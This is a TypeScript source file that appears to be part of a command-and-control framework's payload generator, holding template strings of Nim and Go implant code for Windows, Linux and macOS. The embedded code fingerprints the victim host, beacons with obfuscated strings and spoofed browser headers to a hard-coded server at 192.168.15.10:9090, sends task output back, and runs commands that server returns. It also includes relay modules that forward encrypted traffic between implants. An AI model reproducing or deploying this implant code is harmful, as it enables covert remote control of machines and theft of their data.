function dedent(source: string): string {
  const lines = source.replace(/\r\n/g, "\n").split("\n");
  if (lines[0] === "") lines.shift();
  while (lines.length > 0 && lines[lines.length - 1].trim() === "") lines.pop();

  const nonEmpty = lines.filter((line) => line.trim().length > 0);
  if (nonEmpty.length === 0) return "";
  const indent = Math.min(
    ...nonEmpty.map((line) => /^[\t ]*/.exec(line)?.[0].length ?? 0)
  );
  return lines
    .map((line) => (line.trim().length === 0 ? "" : line.slice(indent)))
    .join("\n");
}

export const stagelessCustomChannelWindows = dedent(`
    import std/json
    import std/strutils
    import std/tables
    import ../utils/global
    import ../utils/general/metadata
    import ../utils/network/http as nhttp
    import ../utils/actions/fingerprint
    import ../utils/tasks/tasks as taskdb
    import ../utils/tasks/utils as tasks
    import ../utils/crypt/transport
    import ../capabilities/sleep/core

    var customServerHost = obf("http://192.168.15.10:9090/")
    const delaySeconds = 2
    customCookies = toTable([
      (obf("session"), obf("example")),
      (obf("token"), obf("example")),
    ])
    customHeaders = toTable([
      (obf("User-Agent"), obf("Mozilla/5.0")),
      (obf("X-Custom-Header"), obf("example")),
    ])

    proc httpPost(
        url, payload: string;
        cookies: Table[string, string];
        headers: Table[string, string]
    ): tuple[code: uint16, body: string] =
      var pairs: seq[(string, string)] = @[(obf("Connection"), obf("close"))]
      for key, value in headers:
        pairs.add((key, value))
      var cookieParts: seq[string] = @[]
      for key, value in cookies:
        cookieParts.add(key & obf("=") & value)
      if cookieParts.len > 0:
        pairs.add((obf("Cookie"), cookieParts.join(obf("; "))))
      let r = nhttp.winHttpPerform(url, "POST", payload, pairs)
      (code: r.code, body: r.body)

    proc postEncrypted(plain: string): tuple[code: uint16, body: string] =
      httpPost(customServerHost, cryptEncryptWithProbe(aesKey, plain), customCookies, customHeaders)

    proc decryptBody(cipher: string): string =
      tryCryptDecrypt(aesKey, cipher)

    proc fingerprintBody(): string =
      resolveHostTag()
      let body = buildFingerprintJson()
      body[obf("metadata")] = createMetadata()
      $(body)

    proc checkinBody(): string =
      let body = %*{
        (obf("option")): obf("input"),
        (obf("host")): hostTag,
        (obf("metadata")): createMetadata(),
      }
      $(body)

    proc batchBody(finished: string): string =
      if finished.len <= 2:
        return finished
      try:
        let batch = parseJson(finished)
        if batch.kind != JArray:
          return finished
        let meta = createMetadata()
        for item in batch:
          if item.kind == JObject:
            item[obf("metadata")] = meta
        return $(batch)
      except JsonParsingError:
        finished

    proc sendFingerprint() =
      while true:
        let resp = postEncrypted(fingerprintBody())
        let msg = decryptBody(resp.body)
        if resp.code == 200 and (msg.contains(obf("host included")) or msg.contains(obf("host already exists"))):
          break
        sleep_now()

    proc main*() =
      sendFingerprint()

      while true:
        let resp = postEncrypted(checkinBody())
        let msg = decryptBody(resp.body)
        if resp.code == 200:
          break
        if resp.code == 400 and isMissingHostResponse(msg):
          sendFingerprint()
        sleep_now()

      while true:
        sleep_now(delaySeconds)
        if tasks.check_output():
          var finished = tasks.get_output()
          if finished.len > 2:
            let resp = postEncrypted(batchBody(finished))
            if resp.code == 200:
              tasks.clear_tasks(true, decryptBody(resp.body))
          finished.setLen(0)

        let resp = postEncrypted(checkinBody())
        let msg = decryptBody(resp.body)
        if resp.code == 400 and isMissingHostResponse(msg):
          sendFingerprint()
        elif msg.len > 0:
          try:
            let data = parseJson(msg)
            if data.kind == JObject and data.hasKey(obf("commands")):
              for _ in data[obf("commands")]:
                discard ensureReady()
                tasks.run_command(msg)
                break
          except JsonParsingError:
            discard
  `);

export const stagelessCustomChannelLinux = dedent(`
  import std/httpclient
  import std/json
  import std/strutils
  import std/tables

  import ../utils/global
  import ../utils/general/metadata
  import ../utils/actions/fingerprint
  import ../utils/tasks/tasks as taskdb
  import ../utils/tasks/utils as tasks
  import ../utils/crypt/transport
  import ../capabilities/sleep

  var customServerHost = obf("http://192.168.15.10:9090/")
  const delaySeconds = 2
  customCookies = toTable([
    (obf("session"), obf("example")),
    (obf("token"), obf("example")),
  ])
  customHeaders = toTable([
    (obf("User-Agent"), obf("Mozilla/5.0")),
    (obf("X-Custom-Header"), obf("example")),
  ])

  proc httpPost(
      url, payload: string;
      cookies: Table[string, string];
      headers: Table[string, string]
  ): tuple[code: uint16, body: string] =
    var client = httpclient.newHttpClient(userAgent = obf(""))
    var pairs: seq[(string, string)] = @[(obf("Connection"), obf("close"))]
    for key, value in headers:
      pairs.add((key, value))
    var cookieParts: seq[string] = @[]
    for key, value in cookies:
      cookieParts.add(key & obf("=") & value)
    if cookieParts.len > 0:
      pairs.add((obf("Cookie"), cookieParts.join(obf("; "))))
    client.headers = httpclient.newHttpHeaders(pairs)
    try:
      let resp = httpclient.post(client, url, payload)
      (code: uint16(httpclient.code(resp)), body: httpclient.body(resp))
    except CatchableError:
      (code: 0'u16, body: obf(""))
    finally:
      httpclient.close(client)

  proc postEncrypted(plain: string): tuple[code: uint16, body: string] =
    httpPost(customServerHost, cryptEncryptWithProbe(aesKey, plain), customCookies, customHeaders)

  proc decryptBody(cipher: string): string =
    tryCryptDecrypt(aesKey, cipher)

  proc fingerprintBody(): string =
    resolveHostTag()
    let body = buildFingerprintJson()
    body[obf("metadata")] = createMetadata()
    $(body)

  proc checkinBody(): string =
    let body = %*{
      (obf("option")): obf("input"),
      (obf("host")): hostTag,
      (obf("metadata")): createMetadata(),
    }
    $(body)

  proc batchBody(finished: string): string =
    if finished.len <= 2:
      return finished
    try:
      let batch = parseJson(finished)
      if batch.kind != JArray:
        return finished
      let meta = createMetadata()
      for item in batch:
        if item.kind == JObject:
          item[obf("metadata")] = meta
      return $(batch)
    except JsonParsingError:
      finished

  proc sendFingerprint() =
    while true:
      let resp = postEncrypted(fingerprintBody())
      let msg = decryptBody(resp.body)
      if resp.code == 200 and (msg.contains(obf("host included")) or msg.contains(obf("host already exists"))):
        break
      sleep_now()

  proc main*() =
    sendFingerprint()

    while true:
      let resp = postEncrypted(checkinBody())
      let msg = decryptBody(resp.body)
      if resp.code == 200:
        break
      if resp.code == 400 and isMissingHostResponse(msg):
        sendFingerprint()
      sleep_now()

    while true:
      sleep_now(delaySeconds)
      if tasks.check_output():
        var finished = tasks.get_output()
        if finished.len > 2:
          let resp = postEncrypted(batchBody(finished))
          if resp.code == 200:
            for id in tasks.outSnap:
              discard taskdb.delete_task(id)
            tasks.outSnap.setLen(0)
        finished.setLen(0)

      let resp = postEncrypted(checkinBody())
      let msg = decryptBody(resp.body)
      if resp.code == 400 and isMissingHostResponse(msg):
        sendFingerprint()
      elif msg.len > 0:
        try:
          let data = parseJson(msg)
          if data.kind == JObject and data.hasKey(obf("commands")):
            for _ in data[obf("commands")]:
              tasks.run_command(msg)
              break
        except JsonParsingError:
          discard
`);

export const stagelessCustomChannelMacos = dedent(`
    package routine

    import (
    	"encoding/json"
    	"io"
    	"net/http"
    	"strings"
    	"time"

    	"stageless/capabilities"
    	"stageless/utils/actions"
    	"stageless/utils/crypt"
    	general "stageless/utils/general"
    	global "stageless/utils"
    	"stageless/utils/network"
    	"stageless/utils/obf"
    	"stageless/utils/tasks"
    )

    var customServerHost = obf.S("http://192.168.15.10:9090/")

    const customDelaySeconds = 2

    var customCookies = map[string]string{
    	obf.S("session"): obf.S("example"),
    	obf.S("token"):   obf.S("example"),
    }

    var customHeaders = map[string]string{
    	obf.S("User-Agent"):       obf.S("Mozilla/5.0"),
    	obf.S("X-Custom-Header"): obf.S("example"),
    }

    func customHTTPPost(url, payload string, cookies, headers map[string]string) (uint16, string) {
    	req, err := http.NewRequest(http.MethodPost, url, strings.NewReader(payload))
    	if err != nil {
    		return 0, obf.S("")
    	}
    	req.Header.Set(obf.S("Connection"), obf.S("close"))
    	for key, value := range headers {
    		req.Header.Set(key, value)
    	}
    	if len(cookies) > 0 {
    		parts := make([]string, 0, len(cookies))
    		for key, value := range cookies {
    			parts = append(parts, key+obf.S("=")+value)
    		}
    		req.Header.Set(obf.S("Cookie"), strings.Join(parts, obf.S("; ")))
    	}
    	client := &http.Client{Timeout: 60 * time.Second}
    	resp, err := client.Do(req)
    	if err != nil {
    		return 0, obf.S("")
    	}
    	defer resp.Body.Close()
    	raw, err := io.ReadAll(resp.Body)
    	if err != nil {
    		return uint16(resp.StatusCode), obf.S("")
    	}
    	return uint16(resp.StatusCode), string(raw)
    }

    func customPostEncrypted(plain string) (uint16, string) {
    	wire := crypt.CryptEncryptWithProbe(global.AesKey, plain)
    	if wire == "" {
    		return 0, obf.S("")
    	}
    	return customHTTPPost(customServerHost, wire, customCookies, customHeaders)
    }

    func customDecryptBody(cipher string) string {
    	return crypt.TryCryptDecrypt(global.AesKey, cipher)
    }

    func customCheckinBody() string {
    	return general.MarshalJSON(map[string]any{
    		obf.S("option"):   obf.S("input"),
    		obf.S("host"):    global.HostTag,
    		obf.S("metadata"): general.CreateMetadata(),
    	})
    }

    func customBatchBody(finished string) string {
    	if len(finished) <= 2 {
    		return finished
    	}
    	var batch []map[string]any
    	if err := json.Unmarshal([]byte(finished), &batch); err != nil {
    		return finished
    	}
    	meta := general.CreateMetadata()
    	for i := range batch {
    		batch[i][obf.S("metadata")] = meta
    	}
    	wire, err := json.Marshal(batch)
    	if err != nil {
    		return finished
    	}
    	return string(wire)
    }

    func customSendFingerprint() {
    	actions.ResolveHostTag()
    	for {
    		body := actions.BuildFingerprintJSON()
    		body[obf.S("metadata")] = general.CreateMetadata()
    		raw, err := json.Marshal(body)
    		if err != nil {
    			capabilities.Sleep_now()
    			continue
    		}
    		code, cipher := customPostEncrypted(string(raw))
    		msg := customDecryptBody(cipher)
    		if code == 200 && (strings.Contains(msg, obf.S("host included")) || strings.Contains(msg, obf.S("host already exists"))) {
    			break
    		}
    		capabilities.Sleep_now()
    	}
    }

    func CustomMain() {
    	customSendFingerprint()

    	for {
    		code, cipher := customPostEncrypted(customCheckinBody())
    		msg := customDecryptBody(cipher)
    		if code == 200 {
    			break
    		}
    		if code == 400 && actions.IsMissingHostResponse(msg) {
    			customSendFingerprint()
    		}
    		capabilities.Sleep_now()
    	}

    	for {
    		capabilities.Sleep_now(customDelaySeconds)
    		if tasks.CheckOutput() {
    			batch := tasks.GetOutput()
    			if len(batch) > 2 {
    				code, _ := customPostEncrypted(customBatchBody(batch))
    				if code == 200 {
    					for _, id := range tasks.OutSnap {
    						tasks.DeleteTask(id)
    					}
    					tasks.OutSnap = nil
    				}
    			}
    		}

    		code, cipher := customPostEncrypted(customCheckinBody())
    		msg := customDecryptBody(cipher)
    		resp := network.HTTPResponse{OK: code > 0, Code: code, Body: msg}
    		if resp.Code == 400 && actions.IsMissingHostResponse(resp.Body) {
    			customSendFingerprint()
    		} else if network.HasCommands(resp) {
    			tasks.RunCommand(resp.Body)
    		}
    	}
    }
  `);

export const stagelessCustomChannelBase = (
  os: "windows" | "linux" | "macos"
): string => {
  if (os === "macos") return stagelessCustomChannelMacos;
  if (os === "linux") return stagelessCustomChannelLinux;
  return stagelessCustomChannelWindows;
};

export const stagelessCustomHttpRelayNim = dedent(`
    import std/httpclient
    import std/json
    import std/strutils
    import std/tables

    import ../../utils/global
    import ../../utils/crypt/transport

    var customServerHost = obf("http://192.168.15.10:9090/")
    customCookies = toTable([
      (obf("session"), obf("example")),
      (obf("token"), obf("example")),
    ])
    customHeaders = toTable([
      (obf("User-Agent"), obf("Mozilla/5.0")),
      (obf("X-Custom-Header"), obf("example")),
    ])

    proc httpPost(
        url, payload: string;
        cookies: Table[string, string];
        headers: Table[string, string]
    ): tuple[code: uint16, body: string] =
      var client = httpclient.newHttpClient(userAgent = obf(""))
      var pairs: seq[(string, string)] = @[(obf("Connection"), obf("close"))]
      for key, value in headers:
        pairs.add((key, value))
      var cookieParts: seq[string] = @[]
      for key, value in cookies:
        cookieParts.add(key & obf("=") & value)
      if cookieParts.len > 0:
        pairs.add((obf("Cookie"), cookieParts.join(obf("; "))))
      client.headers = httpclient.newHttpHeaders(pairs)
      try:
        let resp = httpclient.post(client, url, payload)
        (code: uint16(httpclient.code(resp)), body: httpclient.body(resp))
      except CatchableError:
        (code: 0'u16, body: obf(""))
      finally:
        httpclient.close(client)

    proc postEncrypted(plain: string): tuple[code: uint16, body: string] =
      httpPost(customServerHost, cryptEncryptWithProbe(aesKey, plain), customCookies, customHeaders)

    proc decryptBody(cipher: string): string =
      tryCryptDecrypt(aesKey, cipher)

    proc relayHttpCustomForwardDestiny*(_: JsonNode, contentBody: string): string =
      if contentBody.len == 0:
        return ""
      try:
        let resp = postEncrypted(contentBody)
        if resp.code != 200 or resp.body.len == 0:
          return ""
        let plain = decryptBody(resp.body)
        if plain.len == 0:
          return ""

        let parsed = parseJson(plain)
        var content = parsed
        if parsed.kind == JObject and parsed.hasKey(obf("commands")):
          content = parsed
        elif parsed.kind == JArray:
          var echoedOutput = false
          for item in parsed:
            if item.kind == JObject and item.hasKey(obf("option")) and
                item[obf("option")].getStr() == obf("output"):
              echoedOutput = true
              break
          if echoedOutput:
            content = %*{(obf("commands")): %*[]}
        elif parsed.kind == JObject and parsed.hasKey(obf("option")) and
            parsed[obf("option")].getStr() == obf("output"):
          content = %*{(obf("commands")): %*[]}

        result = $(%*{
          (obf("source")): hostTag,
          (obf("content")): content,
          (obf("chain")): %*[hostTag],
        })
      except JsonParsingError:
        result = ""
      except CatchableError:
        result = ""
  `);

export const stagelessCustomHttpRelayMacos = dedent(`
    package relay

    import (
    	"encoding/json"
    	"io"
    	"net/http"
    	"strings"

    	global "stageless/utils"
    	"stageless/utils/crypt"
    	"stageless/utils/obf"
    )

    var customServerHost = obf.S("http://192.168.15.10:9090/")

    func init() {
    	global.CustomCookies = map[string]string{
    		obf.S("session"): obf.S("example"),
    		obf.S("token"):   obf.S("example"),
    	}
    	global.CustomHeaders = map[string]string{
    		obf.S("User-Agent"):       obf.S("Mozilla/5.0"),
    		obf.S("X-Custom-Header"): obf.S("example"),
    	}
    }

    func httpPost(url, payload string, cookies, headers map[string]string) (uint16, string) {
    	req, err := http.NewRequest(http.MethodPost, url, strings.NewReader(payload))
    	if err != nil {
    		return 0, obf.S("")
    	}
    	req.Header.Set(obf.S("Connection"), obf.S("close"))
    	for key, value := range headers {
    		req.Header.Set(key, value)
    	}
    	if len(cookies) > 0 {
    		parts := make([]string, 0, len(cookies))
    		for key, value := range cookies {
    			parts = append(parts, key+obf.S("=")+value)
    		}
    		req.Header.Set(obf.S("Cookie"), strings.Join(parts, obf.S("; ")))
    	}
    	resp, err := http.DefaultClient.Do(req)
    	if err != nil {
    		return 0, obf.S("")
    	}
    	defer resp.Body.Close()
    	raw, err := io.ReadAll(resp.Body)
    	if err != nil {
    		return uint16(resp.StatusCode), obf.S("")
    	}
    	return uint16(resp.StatusCode), string(raw)
    }

    func postEncrypted(plain string) (uint16, string) {
    	wire := crypt.CryptEncryptWithProbe(global.AesKey, plain)
    	if wire == "" {
    		return 0, obf.S("")
    	}
    	return httpPost(customServerHost, wire, global.CustomCookies, global.CustomHeaders)
    }

    func decryptBody(cipher string) string {
    	return crypt.TryCryptDecrypt(global.AesKey, cipher)
    }

    func RelayHTTPCustomForwardDestiny(_ map[string]any, contentBody string) string {
    	if contentBody == "" {
    		return ""
    	}
    	code, body := postEncrypted(contentBody)
    	if code != 200 || body == "" {
    		return ""
    	}
    	plain := decryptBody(body)
    	if plain == "" {
    		return ""
    	}

    	var parsed any
    	if err := json.Unmarshal([]byte(plain), &parsed); err != nil {
    		return ""
    	}
    	content := parsed
    	switch node := parsed.(type) {
    	case map[string]any:
    		if _, ok := node[obf.S("commands")]; ok {
    			content = node
    		} else if opt, ok := node[obf.S("option")].(string); ok && opt == obf.S("output") {
    			content = map[string]any{obf.S("commands"): []any{}}
    		}
    	case []any:
    		echoedOutput := false
    		for _, item := range node {
    			if m, ok := item.(map[string]any); ok {
    				if opt, ok := m[obf.S("option")].(string); ok && opt == obf.S("output") {
    					echoedOutput = true
    					break
    				}
    			}
    		}
    		if echoedOutput {
    			content = map[string]any{obf.S("commands"): []any{}}
    		}
    	}

    	wire, err := json.Marshal(map[string]any{
    		obf.S("source"):  global.HostTag,
    		obf.S("content"): content,
    		obf.S("chain"):   []string{global.HostTag},
    	})
    	if err != nil {
    		return obf.S("")
    	}
    	return string(wire)
    }
  `);

export const stagelessCustomHttpRelayBase = (
  os: "windows" | "linux" | "macos"
): string => (os === "macos" ? stagelessCustomHttpRelayMacos : stagelessCustomHttpRelayNim);
